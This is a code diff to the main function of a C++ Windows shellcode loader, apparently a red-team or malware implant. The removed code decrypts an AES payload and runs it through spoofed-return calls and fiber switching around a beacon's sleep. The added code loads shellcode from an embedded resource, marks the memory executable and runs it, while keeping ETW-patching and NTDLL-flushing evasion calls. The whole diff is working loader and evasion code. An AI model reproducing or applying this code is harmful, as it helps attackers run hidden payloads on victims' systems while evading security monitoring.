@@ -61,88 +61,63 @@ PVOID lpParameter = nullptr;
 
 
 int main() {
-
-
+	// Optional evasion
 	FlushNTDLL();
 	PatchETW();
 
-	GetFromRc(ResourceSize, ptr);
-	AesCipherText = (PBYTE)malloc((SIZE_T)ResourceSize);
-
-	RetSpoofCall((void*)memcpy, 3, Gdgt, AesCipherText, ptr, (SIZE_T)ResourceSize);
-
-	decryption = AESDecrypt(
-		AesCipherText,
-		ResourceSize,
-		AesKey,
-		AesIv,
-		&pPlainBuffer,
-		&PlainBufferSize
-	);
-
-	if (!decryption) {
-		std::cout << "[+] Decryption UnSuccessful" << std::endl;
+	// 1. Locate the resource containing the shellcode
+	HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_RCDATA1), (LPCSTR)RT_RCDATA);
+	if (!hRes) {
+		std::cout << "[-] Failed to find resource." << std::endl;
 		return -1;
 	}
 
-	pLPI = allocate_large_page(PlainBufferSize);
-
-	place_data_rand(pLPI, (PBYTE)pPlainBuffer, PlainBufferSize);
-
-	free(AesCipherText);
-
-	delete[] pPlainBuffer;
-
-
-	HookFunction(Sleep, FiberSwitcher);
-
-	InitialFiber = (LPVOID)RetSpoofCall((void*)e_ConvertThreadToFiber, 1, Gdgt, lpParameter); // converted the current thread to fiber (InitialFiber)
-
-
-#ifdef _DEBUG_PRINT
-	std::cout << "[DEBUG] Converted current thread to fiber\n";
-#endif
-
-
-	ULONG OldAccessProtection = 0;
-
-	status = reinterpret_cast<NTSTATUS>(RetSpoofCall((void*)NtProtectVirtualMemory, 5, Gdgt, SELF_HANDLE, &pLPI->lpPage, &pLPI->uSize, PAGE_EXECUTE_READ, &OldAccessProtection));
-	
-	NTAPI_VALIDATE_RETURN2NULL(NtProtect_MAIN, status);
-
-	Creation = RetSpoofCall((void*)e_CreateFiber, 3, Gdgt, NULL, (LPFIBER_START_ROUTINE)pLPI->lpData, NULL);  // Created a New fiber on the EntryPoint (PayloadFiber)
-
-
-#ifdef _DEBUG_PRINT
-	std::cout << "[DEBUG] Created the payload fiber\n";
-#endif
-
-
-
-	while (true) { // main infinite loop
-	
-
-#ifdef _DEBUG_PRINT
-	std::cout << "[DEBUG] Switching to payload fiber\n";
-#endif
-		
-	
-	RetSpoofCall((void*)e_SwitchToFiber, 1, Gdgt, Creation);
-		
-
-
-		// THIS PART IS EXECUTED AFTER THE BEACON CALLS SLEEP (FiberSwitcher)
-
-#ifdef _DEBUG_PRINT
-	std::cout << "[DEBUG] Sleeping...\n";
-#endif 
-
-		DelayExecution(dwSleepTime);
-
-		// and then back to loop start
-
+	// 2. Load the resource
+	HGLOBAL hGlobal = LoadResource(NULL, hRes);
+	if (!hGlobal) {
+		std::cout << "[-] Failed to load resource." << std::endl;
+		return -1;
 	}
-	
+
+	// 3. Lock the resource to get a pointer to the shellcode
+	PVOID pShellcode = LockResource(hGlobal);
+	if (!pShellcode) {
+		std::cout << "[-] Failed to lock resource." << std::endl;
+		return -1;
+	}
+
+	// 4. Get the size of the shellcode
+	DWORD dwShellcodeSize = SizeofResource(NULL, hRes);
+	if (dwShellcodeSize == 0) {
+		std::cout << "[-] Resource size is 0." << std::endl;
+		return -1;
+	}
+
+#ifdef _DEBUG_PRINT
+	std::cout << "[DEBUG] Shellcode loaded, size: " << dwShellcodeSize << " bytes.\n";
+#endif
+
+	// 5. Allocate executable memory
+	PVOID pExecMem = VirtualAlloc(NULL, dwShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (!pExecMem) {
+		std::cout << "[-] Failed to allocate memory." << std::endl;
+		return -1;
+	}
+
+	// 6. Copy shellcode to allocated memory
+	memcpy(pExecMem, pShellcode, dwShellcodeSize);
+
+	// 7. Change memory protection to PAGE_EXECUTE_READ
+	DWORD dwOldProtect;
+	if (!VirtualProtect(pExecMem, dwShellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect)) {
+		std::cout << "[-] Failed to change memory protection." << std::endl;
+		return -1;
+	}
+
+	// 8. Execute the shellcode
+	std::cout << "[+] Executing shellcode..." << std::endl;
+	void(*func)() = (void(*)())pExecMem;
+	func();
 
 	return 0;
 }
